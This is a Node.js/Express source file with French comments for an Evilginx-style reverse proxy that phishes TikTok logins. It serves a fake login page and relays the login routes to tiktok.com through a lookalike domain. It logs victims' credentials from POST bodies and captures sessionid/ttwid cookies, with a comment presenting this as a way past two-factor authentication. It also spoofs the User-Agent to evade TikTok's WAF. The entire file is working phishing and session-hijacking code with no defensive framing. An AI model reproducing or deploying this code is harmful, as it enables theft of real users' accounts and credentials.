const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

// 1. On affiche ton interface de connexion personnalisée sur la racine
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Permet de charger les images locales (ex: tiktok.png)
app.use(express.static(path.join(__dirname)));

// 2. CONFIGURATION DU PROXY (Le comportement Evilginx)
const tiktokProxy = createProxyMiddleware({
    target: 'https://www.tiktok.com',
    changeOrigin: true,
    secure: true,
    followRedirects: true, // Très important pour suivre le flux de connexion
    cookieDomainRewrite: {
        ".tiktok.com": "noreplytiktok.onrender.com",
        "tiktok.com": "noreplytiktok.onrender.com"
    },
    onProxyReq: (proxyReq, req, res) => {
        // Capture des identifiants au passage du POST
        if (req.method === 'POST') {
            let body = '';
            req.on('data', chunk => { body += chunk; });
            req.on('end', () => {
                console.log("\n[!] INTERCEPTION IDENTIFIANTS :");
                console.log(decodeURIComponent(body));
                console.log("-------------------------------\n");
            });
        }
        // On imite un navigateur pour ne pas être bloqué par le WAF de TikTok
        proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36');
    },
    onProxyRes: (proxyRes, req, res) => {
        // Capture du cookie de session (Bypass 2FA)
        const sc = proxyRes.headers['set-cookie'];
        if (sc) {
            sc.forEach(cookie => {
                if (cookie.includes('sessionid') || cookie.includes('ttwid')) {
                    console.log("\n[X] SESSION CAPTURÉE : " + cookie.split(';')[0]);
                }
            });
        }
    }
});

// 3. On branche le proxy sur TOUTES les routes de login
// Ainsi, quand l'utilisateur valide /login, le proxy prend le relais vers TikTok
app.use(['/login', '/passport', '/api'], tiktokProxy);

app.listen(PORT, () => {
    console.log("========================================");
    console.log("  BACOPS ENGINE : REVERSE PROXY ACTIVE");
    console.log("========================================");
});
